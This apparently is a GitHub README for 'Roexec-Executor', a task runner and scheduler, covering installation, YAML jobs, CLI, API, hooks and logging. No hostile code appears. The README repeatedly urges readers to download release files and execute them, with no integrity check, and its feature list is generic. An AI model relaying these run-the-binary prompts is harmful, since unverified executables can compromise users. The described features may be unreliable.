# Roexec-Executor — Task Automation, Job Runner for Developers

[![Releases](https://img.shields.io/badge/Releases-Download-blue)](https://github.com/Thisisrohitt/Roexec-Executor/releases)

![Hero image](https://raw.githubusercontent.com/github/explore/main/topics/automation/automation.png)

Roexec-Executor is a lightweight task runner. It runs scripts, schedules jobs, and manages execution logs. Use it to run one-off scripts, repeat tasks, or build small pipelines. It fits CI jobs, local tasks, and server cron replacements.

Table of contents
- Badges
- Quick links
- What it does
- Key features
- Architecture overview
- Install and run (release file)
- Docker and container use
- Configuration (YAML)
- CLI reference
- Scheduler examples
- Hooks and events
- Logging and observability
- Security and user permissions
- Integrations
- Contribute
- License
- Maintainers

Badges
- [![Releases](https://img.shields.io/badge/Releases-Download-blue)](https://github.com/Thisisrohitt/Roexec-Executor/releases)
- [![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/Thisisrohitt/Roexec-Executor/actions)
- [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

Quick links
- Releases and downloads: https://github.com/Thisisrohitt/Roexec-Executor/releases
  - Download the release file and execute it. The releases page will include prebuilt binaries and installer scripts. Look for artifacts named like roexec-executor-vX.Y.Z.tar.gz or roexec-executor-X.Y.Z-linux-amd64.tar.gz. Download the matching file for your OS and run the included installer or binary.

What it does
- Run local scripts or binaries on demand.
- Schedule recurring jobs with cron-like syntax.
- Chain tasks into simple pipelines.
- Capture output and store logs.
- Provide a small HTTP API for job management.
- Support per-job environment isolation and retries.

Key features
- Simple CLI to run, schedule, and manage tasks.
- YAML config for complex job sets.
- Built-in scheduler with cron patterns.
- Per-job resource limits (time, memory).
- Retry and backoff strategies.
- Hooks for pre-run and post-run actions.
- HTTP API to trigger jobs programmatically.
- Container-friendly binary and Docker image.
- Plain text logs and JSON log export.

Architecture overview
- Core runner: Executes commands and scripts. Handles timeouts, exit codes, and captures stdout and stderr.
- Scheduler: Reads schedule definitions and triggers the core runner.
- Store: Keeps job metadata and logs. Supports local file backend and optional remote backend.
- API server: Exposes endpoints to list jobs, run jobs, and stream logs.
- CLI: Small command set to install, run, and manage.

Flow
1. User defines job in YAML or via CLI.
2. Scheduler picks job at correct time.
3. Core runner executes the job in a set context.
4. Runner writes logs and metadata to the store.
5. API serves job status and logs.

Install and run (release file)
- Visit the releases page at:
  https://github.com/Thisisrohitt/Roexec-Executor/releases
- Download the artifact that matches your system. Examples you may see:
  - roexec-executor-1.2.3-linux-amd64.tar.gz
  - roexec-executor-1.2.3-darwin-x86_64.tar.gz
  - roexec-executor-1.2.3-windows-amd64.zip
- Extract and run the binary:
  - Linux / macOS:
    - tar -xzf roexec-executor-1.2.3-linux-amd64.tar.gz
    - cd roexec-executor-1.2.3
    - sudo cp roexec /usr/local/bin/roexec
    - roexec --help
  - Windows:
    - Unzip roexec-executor-1.2.3-windows-amd64.zip
    - Run roexec.exe from PowerShell or CMD:
      - .\roexec.exe --help

Install from source (advanced)
- Clone the repo
  - git clone https://github.com/Thisisrohitt/Roexec-Executor.git
  - cd Roexec-Executor
- Build (Go toolchain example)
  - go build -o roexec ./cmd/roexec
  - mv roexec /usr/local/bin/

Run a one-off command
- roexec run --name hello -- cmd echo "Hello, Roexec!"
- The command runs and stores logs under the default store path.

Service install (systemd)
- Create a systemd unit:
  - /etc/systemd/system/roexec.service
  - [Unit]
    Description=Roexec Executor Service
    After=network.target
  - [Service]
    ExecStart=/usr/local/bin/roexec server --config /etc/roexec/config.yml
    Restart=on-failure
    User=roexec
    Group=roexec
  - [Install]
    WantedBy=multi-user.target
- Enable and start:
  - sudo systemctl daemon-reload
  - sudo systemctl enable roexec
  - sudo systemctl start roexec

Docker and container use
- Pull image (example)
  - docker pull ghcr.io/thisisrohitt/roexec-executor:latest
- Run as container
  - docker run -d --name roexec \
    -v /var/lib/roexec:/data \
    -p 8080:8080 \
    ghcr.io/thisisrohitt/roexec-executor:latest \
    server --config /data/config.yml
- Example docker-compose
  - version: '3.7'
    services:
      roexec:
        image: ghcr.io/thisisrohitt/roexec-executor:latest
        volumes:
          - ./data:/data
        ports:
          - "8080:8080"
        command: server --config /data/config.yml

Configuration (YAML)
- Config file controls scheduler, store, API, and defaults.
- Example: /etc/roexec/config.yml
  - server:
      host: 0.0.0.0
      port: 8080
  - store:
      type: local
      path: /var/lib/roexec
  - scheduler:
      max-concurrent: 10
  - defaults:
      timeout: 60s
      retries: 2

Job file format (jobs.yml)
- jobs:
  - id: backup-db
    name: Backup database
    schedule: "0 2 * * *"
    command: /usr/local/bin/backup.sh
    env:
      DB_HOST: db.internal
      DB_USER: backup
    timeout: 1h
    retries: 3
    backoff: 30s
    notify:
      on_failure: /usr/local/bin/notify.sh

Fields explained
- id: Unique job id.
- name: Human name.
- schedule: Cron spec. Leave empty to run manually only.
- command: Shell command or script path.
- env: Map of environment variables.
- timeout: Max run time.
- retries: Number of retries on failure.
- backoff: Wait before retry.
- notify: Hook commands for events.

Run a YAML job set
- roexec apply -f jobs.yml
- This registers jobs in the store.
- Scheduler loads registered jobs automatically.

CLI reference
- roexec --help
- roexec run
  - roexec run --id <job-id> [--detach] [--env KEY=VAL]
  - Example: roexec run --id hello
- roexec list
  - List registered jobs: roexec list jobs
  - Show active tasks: roexec list runs
- roexec logs
  - Stream logs: roexec logs --id <run-id> --follow
- roexec server
  - Start the HTTP API and scheduler.
  - roexec server --config /etc/roexec/config.yml
- roexec apply
  - Load YAML files: roexec apply -f jobs.yml
- roexec exec
  - Run a raw command: roexec exec -- cmd ls -la

Options
- --config PATH: Use config file.
- --store PATH: Override store path.
- --verbose: Increase log level.
- --dry-run: Validate job set without registering.

HTTP API
- The server exposes a small API. Default endpoint: http://localhost:8080
- Endpoints
  - GET /api/v1/jobs
    - List jobs.
  - GET /api/v1/jobs/{id}
    - Job details.
  - POST /api/v1/jobs/{id}/run
    - Trigger job run.
    - Payload: {"env": {"KEY": "VAL"}}
  - GET /api/v1/runs/{run_id}/logs
    - Stream run logs.
  - GET /api/v1/health
    - Health check.

Example curl calls
- List jobs
  - curl http://localhost:8080/api/v1/jobs
- Trigger job
  - curl -X POST http://localhost:8080/api/v1/jobs/backup-db/run
- Stream logs
  - curl http://localhost:8080/api/v1/runs/abcd1234/logs

Scheduler examples
- Basic cron
  - schedule: "0 0 * * *"
  - Runs midnight daily.
- Every 15 minutes
  - schedule: "*/15 * * * *"
- Weekday only
  - schedule: "0 9 * * 1-5"
- Advanced: cron + window
  - schedule: "0 12 * * *"
  - window:
      start: "2025-01-01T00:00:00Z"
      end: "2025-12-31T23:59:59Z"
  - Scheduler skips runs outside the window.

Retry and backoff
- retries: Number of attempts after first failure.
- backoff: Fixed backoff before next attempt.
- Example:
  - retries: 5
  - backoff: 1m
  - This retries up to five times with one minute between attempts.

Concurrency and limits
- Per-job limits:
  - max-concurrent: Number of parallel runs allowed per job.
  - Example:
    - job:
        id: sync
        max-concurrent: 2
- Global limits:
  - scheduler.max-concurrent: Max total concurrent runs.

Hooks and events
- Hooks run as commands before or after job runs.
- Supported hooks:
  - pre_run: Run before the job command.
  - post_run: Run after the job finishes (success or fail).
  - on_success: Run when job succeeds.
  - on_failure: Run when job fails.
- Example:
  - hooks:
      pre_run: /usr/local/bin/pre-check.sh
      on_failure: /usr/local/bin/alert.sh

Sample job with hooks
- jobs:
  - id: deploy
    command: /usr/local/bin/deploy.sh
    hooks:
      pre_run: /usr/local/bin/check-prereqs.sh
      post_run: /usr/local/bin/cleanup.sh
      on_failure: /usr/local/bin/notify-ops.sh

Logging and observability
- Roexec stores logs as text files by default.
- Default log path: /var/lib/roexec/logs
- Log rotation:
  - roexec rotates logs daily and keeps the last 7 days.
- JSON export:
  - roexec supports exporting logs in JSON for ingestion.
  - roexec logs export --format json --since 24h > logs.json
- External collectors
  - You can push logs to external systems through hooks or the API.
  - Example: on_finish hook that posts logs to an HTTP endpoint.

Log sample (plain)
- /var/lib/roexec/logs/backup-db/2025-08-01T02:00:00.log
  - 2025-08-01T02:00:00Z [INFO] Starting run
  - 2025-08-01T02:00:02Z [INFO] Running /usr/local/bin/backup.sh
  - 2025-08-01T02:05:15Z [INFO] Completed, exit=0

Monitoring
- Health endpoint: /api/v1/health
- Metrics:
  - roexec exposes Prometheus metrics at /metrics when enabled.
  - Metrics cover run_count, run_duration_seconds, run_errors_total.

Security and user permissions
- Run with least privilege.
- Do not run arbitrary user scripts as root.
- Use per-job user mapping:
  - job:
      id: app-maintenance
      user: appuser
- File permissions:
  - Store files should be owned by the service user.
  - /var/lib/roexec should not be world writable.

Secrets and environment
- Avoid putting secrets in job YAML in plain text.
- Use environment injection via secure systems:
  - Integrate with Vault via hooks.
  - Use host-level environment variables for service.
- Example secret placeholder:
  - env_from:
      secret: vault://secret/data/roexec/backup-db

Resource limits and timeouts
- timeout enforces the max wall time. The runner sends SIGTERM then SIGKILL after a grace period.
- Memory limits: Runner can enforce memory limits when run in a container. For native runs, rely on cgroups or containers.

Integration examples
- GitHub Actions
  - Run a Roexec job as part of a workflow:
    - - name: Trigger Roexec job
        run: curl -X POST http://roexec.example/api/v1/jobs/deploy/run
- CI
  - Use roexec to run nightly test suites and store logs for analysis.
- Slack
  - Hook into on_failure to post messages.
  - Example:
    - on_failure: curl -X POST -H "Content-Type: application/json" -d '{"text":"Job failed"}' https://hooks.slack.com/services/xxxx

Advanced usage
- Pipeline mode
  - Chain jobs to run in order with inputs and outputs.
  - Example:
    - pipeline:
        - id: build
          command: ./build.sh
        - id: test
          command: ./test.sh
          depends_on: [build]
        - id: deploy
          command: ./deploy.sh
          depends_on: [test]
- Conditional runs
  - Use exit code patterns or log checks.
  - Example:
    - on_success:
        - command: ./notify-success.sh
        - condition: test -f build/artifact.tar.gz

Examples and recipes
- Backup and rotate
  - jobs:
    - id: backup-db
      command: /usr/local/bin/backup-db.sh
      schedule: "0 3 * * *"
      timeout: 2h
      on_success: /usr/local/bin/rotate-backups.sh
- Web health checker every 5 minutes
  - jobs:
    - id: web-check
      command: curl -fS https://example.com/health || exit 1
      schedule: "*/5 * * * *"
      on_failure: /usr/local/bin/alert-web.sh
- Deploy with canary
  - jobs:
    - id: deploy-canary
      command: ./deploy.sh --canary
      schedule: ""
      on_success: ./promote.sh --if-checks-pass

API token example
- roexec supports basic auth and token auth.
- To create a token:
  - roexec token create --name ci-token --scope run:list,run:create
  - The server stores tokens in the store. Use them in API calls:
    - curl -H "Authorization: Bearer <token>" -X POST http://localhost:8080/api/v1/jobs/deploy/run

Store backends
- Local file (default)
  - path: /var/lib/roexec
  - Good for single-instance or simple installs.
- SQLite
  - type: sqlite
  - path: /var/lib/roexec/roexec.db
- Remote store (optional)
  - type: s3
  - bucket: roexec-store
  - Use remote stores for HA setups. The runner caches metadata locally.

High availability and clustering (advanced)
- Roexec supports a leader election mode for multiple instances.
- Use a shared store and set one instance as leader.
- Config option:
  - clustering:
      enabled: true
      leader_election: etcd://etcd-cluster:2379

Best practices
- Keep jobs small and focused.
- Use retries for flaky tasks.
- Use hooks to centralize alerting.
- Limit max-concurrent runs to avoid resource spikes.
- Use containers for isolation when running untrusted code.
- Use separate stores for staging and production.

Contribute
- Want to help? Steps:
  - Fork the repo.
  - Create a branch for your feature.
  - Write tests for new code.
  - Run go test ./...
  - Submit a pull request.
- Coding style:
  - Keep commands simple and clear.
  - Document any public API changes.
  - Use small, focused commits.

Development setup
- Install Go 1.20+ (or the version listed in go.mod).
- Clone and build:
  - git clone https://github.com/Thisisrohitt/Roexec-Executor.git
  - cd Roexec-Executor
  - go build ./...
- Run tests:
  - go test ./...

Testing jobs locally
- Use the built-in local store:
  - mkdir -p /tmp/roexec
  - roexec server --config examples/config-local.yml --store /tmp/roexec
- Apply example jobs:
  - roexec apply -f examples/jobs.yml

Roadmap (examples of planned items)
- Add plugin system for custom runners.
- Add interactive web UI for job control.
- Add role-based access control (RBAC).
- Add more store backends and better multi-node support.

Troubleshooting
- If a job does not start:
  - Check scheduler.max-concurrent and job max-concurrent.
  - Check the system logs for permission errors.
- If logs are missing:
  - Ensure the store path is correct and writable.
  - Check the service user file permissions.
- If the API returns 401:
  - Verify token or credentials.
  - Check auth config in the server.

Example troubleshooting commands
- Check service status
  - sudo systemctl status roexec
- Tail the server log
  - journalctl -u roexec -f
- List jobs via API
  - curl http://localhost:8080/api/v1/jobs

Assets and images
- Use this badge to link to the releases page:
  - [![Download Releases](https://img.shields.io/badge/Download%20Releases-blue)](https://github.com/Thisisrohitt/Roexec-Executor/releases)
- See releases at:
  - https://github.com/Thisisrohitt/Roexec-Executor/releases
  - Download the release file and execute it. You will find a binary or installer script for your platform.

Security checklist
- Use separate user for the service.
- Limit file permissions on the store.
- Avoid exposing the API port to the public internet without auth.
- Rotate API tokens periodically.

Common patterns
- Durable tasks: Use retries and persistent store for tasks that must not drop.
- Short tasks: Prefer direct run or detached runs.
- Long tasks: Use timeout and resource limits.

Example logs and output
- Success
  - 2025-08-01T12:00:00Z [INFO] Run abcd1234 started
  - 2025-08-01T12:00:35Z [INFO] Run abcd1234 completed, exit=0
- Failure with retry
  - 2025-08-01T12:05:00Z [ERROR] Run wxyz987 failed, exit=1
  - 2025-08-01T12:05:05Z [INFO] Retrying (1/3) after backoff 30s

Examples for scripting and CI
- Trigger job from GitHub Actions
  - - name: Trigger Roexec job
      run: |
        curl -X POST -H "Authorization: Bearer ${{ secrets.ROEXEC_TOKEN }}" \
          http://roexec.example/api/v1/jobs/deploy/run
- Use in Jenkins
  - Use a shell step to call roexec run or trigger the API.

Maintenance and housekeeping
- Rotate logs and purge old runs:
  - roexec maintenance purge --older 30d
- Backup store
  - tar -czf roexec-store-backup.tgz /var/lib/roexec

Release download note
- The releases page contains ready-to-run files. Download the release file and execute it. The link:
  - https://github.com/Thisisrohitt/Roexec-Executor/releases
  - Run the binary after extraction or run the installer script included in the release.

Contact and support
- Open an issue on GitHub for bugs or feature requests.
- Use pull requests for code changes.

License
- MIT License. See LICENSE file.

Maintainers
- Primary: rohit (Thisisrohitt)
- Reach via GitHub issues or PRs.

Assets and visuals
- Hero image: automation topic from GitHub Explore
  - https://raw.githubusercontent.com/github/explore/main/topics/automation/automation.png
- Badges: img.shields.io used above.

Changelog
- Check the releases page for version notes and download links:
  - https://github.com/Thisisrohitt/Roexec-Executor/releases
  - Download the release file and execute it to install the specified version.

Common questions
- How do I run a job now?
  - Use roexec run --id <job-id> or POST to the API.
- How do I view logs?
  - roexec logs --id <run-id> or GET /api/v1/runs/{run_id}/logs.
- How do I add a new job?
  - Add it to jobs.yml and run roexec apply -f jobs.yml.

Example project usage (full walk-through)
1. Install the binary from the releases page.
2. Create a config at /etc/roexec/config.yml.
3. Create jobs.yml with the tasks you need.
4. Start the server: roexec server --config /etc/roexec/config.yml
5. Apply jobs: roexec apply -f jobs.yml
6. Verify runs in the UI or CLI: roexec list runs
7. Stream logs: roexec logs --id <run-id> --follow

Legal
- See LICENSE for full terms.

Thank you for checking out Roexec-Executor.